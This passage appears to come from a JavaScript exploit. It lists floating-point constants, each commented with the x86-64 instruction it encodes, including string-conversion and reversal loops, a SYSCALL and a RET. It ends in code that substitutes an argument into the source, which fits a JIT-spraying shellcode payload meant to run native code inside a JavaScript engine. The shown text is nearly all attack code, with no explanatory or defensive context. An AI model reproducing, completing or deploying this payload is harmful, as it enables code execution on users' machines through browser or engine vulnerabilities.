            7.749668562670808e-304,  // 154[0x0da9 + 0x17]: MOV [rbx], edx 
            8.022857868396706e-304,  // 155[0x0dc0 + 0x17]: INC rbx 
            7.749682469454117e-304,  // 156[0x0dd7 + 0x17]: TEST eax, eax 
            7.748608424803653e-304,  // 157[0x0dee + 0x17]: NOP 
            7.748608451965199e-304,  // 158[0x0e05 + 0x17]: NOP 
            5.636005164517401e-232,  // 159[0x0e1c + 0x17]: JNZ :convert_loop => 0x0d64 
            8.031758164679534e-304,  // 160[0x0e33 + 0x17]: DEC rbx 
            8.03353822530893e-304,   // 161[0x0e4a + 0x17]: MOV rdx, rbx 
            8.03531828768483e-304,   // 162[0x0e61 + 0x17]: MOV rcx, rdi 
            // reverse_loop [0x0e78]:
            7.749731142868107e-304,  // 163[0x0e78 + 0x17]: MOV al, [rdi] 
            7.749738096231789e-304,  // 164[0x0e8f + 0x17]: MOV bl, [rdx] 
            7.749745049589666e-304,  // 165[0x0ea6 + 0x17]: MOV [rdi], bl 
            7.749752002933455e-304,  // 166[0x0ebd + 0x17]: MOV [rdx], al 
            8.044218577862775e-304,  // 167[0x0ed4 + 0x17]: INC rdi 
            8.04599863726788e-304,   // 168[0x0eeb + 0x17]: DEC rdx 
            8.047778697651921e-304,  // 169[0x0f02 + 0x17]: CMP rdi, rdx 
            5.636005165596589e-232,  // 170[0x0f19 + 0x17]: JMP :reverse_loop => 0x0e78 
            8.051338815802324e-304,  // 171[0x0f30 + 0x17]: ADD rdi, rdx 
            8.053118874056909e-304,  // 172[0x0f47 + 0x17]: SUB rdi, rcx 
            8.05489893238361e-304,   // 173[0x0f5e + 0x17]: INC rdi 
            7.749807629862253e-304,  // 174[0x0f75 + 0x17]: XOR ecx, ecx 
            7.749814583141115e-304,  // 175[0x0f8c + 0x17]: MOV [rdi], ecx 
            8.060239109644027e-304,  // 176[0x0fa3 + 0x17]: INC rdi 
            -2.3938077447834984e-72, // 177[0x0fba + 0x17]: MOV eax, 63 
            7.749835443204196e-304,  // 178[0x0fd1 + 0x17]: SYSCALL 
            7.749842396584604e-304,  // 179[0x0fe8 + 0x17]: PUSH 64 
            7.748609049519123e-304,  // 180[0x0fff + 0x17]: POP rax 
            // return [0x1016]:
            7.748609076680842e-304,  // 181[0x1016 + 0x17]: RET 
        ];
        return a[0];
    `.replace('7.7', arg));
}